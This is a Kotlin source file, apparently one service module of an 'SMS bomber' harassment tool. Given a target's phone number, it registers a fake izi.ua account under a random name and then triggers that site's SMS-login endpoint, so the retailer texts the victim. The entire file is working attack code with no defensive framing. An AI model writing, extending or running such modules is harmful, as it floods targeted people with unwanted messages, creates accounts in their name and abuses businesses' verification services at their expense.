package ktxdev.b0mb3r.services

import ktxdev.b0mb3r.BaseService
import ktxdev.b0mb3r.Utils
import org.json.JSONObject

class IziUA : BaseService() {
    override fun onRun(countryCode: String, phoneNumber: String) {
        super.onRun(countryCode, phoneNumber)

        post("https://izi.ua/api/auth/register",
            JSONObject()
                .put("phone", "+${countryCode}${phoneNumber}")
                .put("name", Utils.getRandomRussianName())
                .put("is_terms_accepted", true)
        )

        post("https://izi.ua/api/auth/sms-login",
            JSONObject()
                .put("phone", "+${countryCode}${phoneNumber}")
        )
    }
}